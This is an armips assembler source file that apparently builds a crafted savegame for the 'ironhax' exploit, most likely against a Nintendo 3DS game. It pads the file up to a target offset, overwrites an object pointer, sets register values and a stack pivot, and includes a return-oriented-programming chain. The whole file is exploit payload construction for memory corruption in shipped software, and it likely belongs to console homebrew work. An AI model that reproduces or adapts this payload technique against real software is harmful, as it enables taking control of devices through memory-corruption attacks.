.nds

.create "Data",0x0

.loadtable "unicode.tbl"

.include "iron_constants.s"
.include "iron_macros.s"

.orga 0x4
	.string "ironhax"
	.byte 0x00
	.byte 0x00

.orga 0x58
	.fill (0x130 - .), 0xDA

.orga 0x130
	; object pointer overwrite
	; can only have 0x00 as the MSB
	.word OBJECT_BUFFER_REF_PTR ; r4 (moved to r0 before jump)

.orga 0x400
		.word 0xBADB00B5 ; r0
		.word 0xF00DC0DE ; r2
		.word 0xDAD0DEAD ; r3
		.word 0xBAD0CAFE ; r7
		.word 0xDEADC0DE ; ip
		.word ROP_PTR ; sp
		.word ROP_IRON_NOP ; pc
	object_reference:
		.word OBJECT_BUFFER_PTR ; r0 (temporarily)

.orga 0x500
	object_buffer:
		.word 0xDEADBABE ; pc
		.word 0xDADADADA
		.word 0xDADADADA
		.word 0xDADADADA
		.word STACK_PIVOT_PTR ; r1

.orga 0x600
	.include "iron_rop.s"

	.fill (0x2000 - .), 0x00

.Close
